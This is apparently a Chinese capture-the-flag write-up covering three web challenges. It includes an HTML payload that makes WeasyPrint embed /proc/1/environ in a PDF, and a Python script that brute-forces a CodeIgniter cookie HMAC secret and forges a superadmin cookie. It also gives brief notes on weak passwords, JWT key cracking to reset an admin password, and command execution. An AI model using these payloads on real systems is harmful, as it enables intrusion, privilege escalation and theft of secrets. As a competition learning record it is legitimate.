# web
### CSDN_To_PDF V1.2
#ssrf 
WeasyPrint 61.2 html渲染为pdf
写一个html
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
</head>
<body>
<link rel="attachment" href="file:///proc/1/environ">
</body>
</html>
```

binwalk -e 提取pdf文件即可看到

### baby-Codeigniter
一个登录页面   /index.php/login

cookie是一个类似于php序列化后的东西

---
弱口令admin/123456登录后发现上传文件需要superadmin,发现cookie里有这个字段,但是最后有一串hash做校验,
需要爆破,注意不需要url解码,爆破得到123456
```python
import hmac
import urllib.parse
import hashlib
import sys
import time

def EncryCookie(cookie,secret):
    cookie = urllib.parse.unquote_plus(cookie)
    cookielen=len(cookie)-40
    cookie = cookie[:cookielen].replace('"superadmin";b:0;}','"superadmin";b:1;}')
    hmacstr=hmac.new(secret.encode("utf-8"),cookie.encode("utf-8"),hashlib.sha1).hexdigest()
    return urllib.parse.quote_plus(cookie+hmacstr)


def CrackSecret(cookie,secret):
    cookie = urllib.parse.unquote_plus(cookie)
    cookielen=len(cookie)-40
    hmac_check = cookie[cookielen:]
    cookie = cookie[:cookielen]
    hmacstr=hmac.new(secret.encode("utf-8"),cookie.encode("utf-8"),hashlib.sha1).hexdigest()
    return hmac_check == hmacstr

if __name__ == "__main__":
    cookie = sys.argv[1]
    secrets = []
    with open("secret.txt") as f:
        secrets = f.readlines()
    print("开始爆破:")
    starttime=time.time()
    for secret in secrets:
        secret=secret.strip("\n")
        result  = CrackSecret(cookie,secret)
        if result == True:
            print("[+]Secret:"+secret)
            encrycookie=EncryCookie(cookie,secret)
            print(encrycookie)
            endtime=time.time()
            print("耗时:"+str(endtime-starttime))
            exit(0)
        else:
            print("[-]Secret:"+secret)
```


### 组合拳
首先注册一个账号,登录提示权限不够
尝试忘记密码收到一份邮件
发现存在jwt,爆破得到密钥,重置admin的密码

admin邮箱  `Administrator@163.com`

---
发现后台存在任意命令执行,但是运行时间为10天后,需要修改这个参数
# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2024-04-04   20:27